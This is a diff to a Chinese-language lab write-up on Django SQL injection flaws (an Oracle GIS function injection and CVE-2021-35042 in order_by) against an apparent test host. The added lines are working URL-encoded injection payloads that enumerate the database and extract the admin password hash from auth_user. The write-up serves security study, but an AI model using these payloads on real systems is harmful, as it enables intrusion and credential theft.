@@ -168,7 +168,38 @@ Django 的 GIS（地理信息系统）查询功能中，某些空间查询函数
 http://192.168.197.88:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null OR (1+1
 ```
 SQL 错误回显，确认注入存在。
+![](images/Pasted%20image%2020261105103554.png)
+以下 Payload 都进行了 **URL 编码** ，核心模板是：  
+`q=20) = 1 OR (select utl_inaddr.get_host_name((<你的子查询>)) from dual) is null OR (1+1`
 
+1. **获取当前数据库用户**
+```text wrap
+http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20user%20FROM%20DUAL))%20from%20dual)%20is%20null%20OR%20(1%2B1
+```
+预期在报错信息中看到类似：`ORA-29257: host 用户名 unknown`
+![](images/Pasted%20image%2020261105104450.png)
+2. **获取数据库版本**
+```text wrap
+http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20version%20FROM%20v%24instance))%20from%20dual)%20is%20null%20OR%20(1%2B1
+```
+预期在报错信息中看到类似：`ORA-29257: host 版本号 unknown`
+![](images/Pasted%20image%2020261105104611.png)
+3. **获取所有表名**
+```text wrap
+http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20listagg(table_name%2C%20%27%2C%27)%20WITHIN%20GROUP%20(ORDER%20BY%20table_name)%20FROM%20user_tables))%20from%20dual)%20is%20null%20OR%20(1%2B1
+```
+预期在报错信息中看到以逗号分隔的所有表名。
+![](images/Pasted%20image%2020261105104652.png)
+4. **获取指定表的列名（以 AUTH_USER 为例）**
+```text wrap
+http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20listagg(column_name%2C%20%27%2C%27)%20WITHIN%20GROUP%20(ORDER%20BY%20column_name)%20FROM%20user_tab_columns%20WHERE%20table_name%20%3D%20%27AUTH_USER%27))%20from%20dual)%20is%20null%20OR%20(1%2B1
+```
+![](images/Pasted%20image%2020261105104734.png)
+5. **提取管理员（admin）密码哈希**
+```text wrap
+http://192.168.197.88:8000/vuln/?q=20)%20%3D%201%20OR%20(select%20utl_inaddr.get_host_name((SELECT%20password%20FROM%20AUTH_USER%20WHERE%20username%20%3D%20%27admin%27%20AND%20ROWNUM%20%3D%201))%20from%20dual)%20is%20null%20OR%20(1%2B1
+```
+![](images/Pasted%20image%2020261105104849.png)
 ### 5. CVE-2021-35042（order_by SQL 注入）
 **漏洞原理**：
 当开发者将用户可控的输入直接传递给 `QuerySet.order_by()` 函数用于动态排序时，Django 未对传入的字段名（列名）进行有效性校验，允许包含特殊字符。攻击者可以通过构造恶意的排序参数闭合原有的 SQL 语句，并附加任意 SQL 查询（如报错注入、联合查询），从而获取数据库敏感信息。
@@ -179,6 +210,57 @@ SQL 错误回显，确认注入存在。
 http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23
 ```
 页面报错并回显数据库版本信息，利用成功。
+![](images/Pasted%20image%2020261105111315.png)
+后续所有Payload都基于以下基础模板构造：  
+`http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select updatexml(1, concat(0x7e, (<你的子查询>), 0x7e), 1)%23`
+#### 1. 获取数据库版本
+获取当前数据库的版本信息。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@version),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~8.0.xx~'`
+
+#### 2. 获取当前数据库名
+获取当前连接的数据库名称。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database()),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~vuln~'` (或实际的库名)
+
+#### 3. 获取当前数据库用户
+获取当前连接数据库的系统用户。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20user()),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~root@localhost~'`
+
+#### 4. 获取当前数据库中的所有表名
+查询 `information_schema.tables` 来获取当前数据库下的所有表。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~auth_group,auth_permission,auth_user,...~'` (表名列表)
+
+#### 5. 获取指定表（如 `auth_user`）的列名
+查询 `information_schema.columns` 来获取 `auth_user` 表的所有列名。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='auth_user'),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~id,password,last_login,is_superuser,username,...~'` (列名列表)
+
+#### 6. 提取管理员账号和密码哈希
+从 `auth_user` 表中提取 `username` 和 `password` 字段。由于 `updatexml` 报错长度有限（约32字符），若哈希较长，可使用 `substring` 分次提取。
+```text wrap
+http://192.168.197.88:8000/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20concat(username,0x3a,substring(password,1,32))%20from%20auth_user%20limit%200,1),0x7e),1)%23
+```
+**预期报错**：`XPATH syntax error: '~admin:pbkdf2_sha256$150000$...~'`
+
+
+
+
+
+
+
 
 ### 6. CVE-2022-34265（Trunc/Extract SQL 注入）
 **漏洞原理**：
